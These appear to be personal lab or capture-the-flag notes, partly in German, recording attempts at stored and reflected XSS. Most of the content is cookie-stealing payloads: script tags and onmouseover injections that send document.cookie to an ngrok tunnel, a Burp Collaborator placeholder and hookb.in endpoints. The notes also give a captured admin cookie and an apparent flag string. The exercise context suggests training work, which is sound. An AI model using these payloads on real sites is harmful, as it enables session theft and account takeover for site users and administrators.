## XSS - Stored 1

<script>alert("Alert");</script>
![[Screen Shot 2021-11-18 at 00.03.51.png]]
![[Screen Shot 2021-11-18 at 00.06.36.png]]
https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/

https://vimeo.com/19144435

https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page
<script> fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
![[Screen Shot 2021-11-19 at 20.39.25.png]]

![[Screen Shot 2021-11-19 at 20.59.43.png]]
![[Screen Shot 2021-11-19 at 21.04.20.png]]
![[Screen Shot 2021-11-19 at 21.00.02.png]]

<script>document.write('<img src="https://951d-2001-7c7-1180-823-48ef-3919-4642-97a8.ngrok.io?cookie='+document.cookie+"/>');</script>

=> nichts auf dem server bekommen

<script>document.write('<img src="https://951d-2001-7c7-1180-823-48ef-3919-4642-97a8.ngrok.io?cookie=' + document.cookie + '" />')</script>
=> etwas bekommen:

![[Screen Shot 2021-11-19 at 21.16.39.png]]
![[Screen Shot 2021-11-19 at 21.16.48.png]]

https://developers.google.com/analytics/devguides/collection/analyticsjs/cookies-user-id

![[Screen Shot 2021-11-19 at 21.31.40.png]]

-> somehow the message is read but nothing special comes on the server
![[Screen Shot 2021-11-19 at 21.32.04.png]]
![[Screen Shot 2021-11-19 at 21.32.16.png]]

=> after some time, finally!!
![[Screen Shot 2021-11-19 at 21.40.52.png]]
![[Screen Shot 2021-11-19 at 21.41.12.png]]

/?cookie=ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6 - No such file or directory

<script>document.location='http://951d-2001-7c7-1180-823-48ef-3919-4642-97a8.ngrok.io?c='+document.cookie</script>
![[Screen Shot 2021-11-19 at 21.47.02.png]]
-> got the cookie again, I have to be patient and wait for the admin to check the message

![[Screen Shot 2021-11-19 at 21.49.43.png]]



exp' onmouseover='document.location=%22https://hookb.in/JK08pq1OzMFg0l990xVr?%22.concat(document.cookie)

exp' onmouseover='document.location=%22https://hookb.in/Dr0NNaXkO1hPajxxazeq?%22.concat(document.cookie)

r3fL3ct3D_XsS_fTw

test'onmouseover='document.location=%22https://hookb.in/3One9l7Djnu7yakkymWL?%22.concat(document.cookie)


